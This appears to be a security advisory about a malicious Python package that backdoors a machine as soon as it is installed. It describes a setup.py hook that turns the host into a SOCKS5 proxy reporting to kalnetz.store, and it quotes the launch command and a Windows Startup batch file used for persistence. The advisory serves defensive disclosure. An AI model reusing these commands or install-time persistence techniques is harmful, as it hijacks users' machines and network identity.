summary: prosocks installs residential-proxy backdoor beaconing to kalnetz.store
details: setup.py auto-launches the package's agent at pip install time via a top-level launch_proxy() call and a PostInstall cmdclass, spawning `python -m prosocks https://kalnetz.store` as a background process. The agent opens a SOCKS5 relay on 0.0.0.0:9050 with a generated password and POSTs the installer's public IP (resolved via ip-api.com/ipify), agent id, hostname, chosen port, and the SOCKS5 password to https://kalnetz.store/api/register, then sends periodic heartbeat and bandwidth reports to /api/heartbeat and /api/bandwidth with TLS verification disabled (verify=False). setup.py also writes prosocks.bat into the per-user Windows Startup folder (%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\prosocks.bat) containing `start /B "" "<python>" -m prosocks https://kalnetz.store`, re-launching the agent on every login. Net effect: any pip install of this package enrolls the host as a remotely-controlled SOCKS5 exit node in a residential-proxy botnet, with the operator of kalnetz.store able to route arbitrary traffic through the installer's network identity and re-establish the channel across reboots.

cwes.description: The product contains code that appears to be malicious in nature.
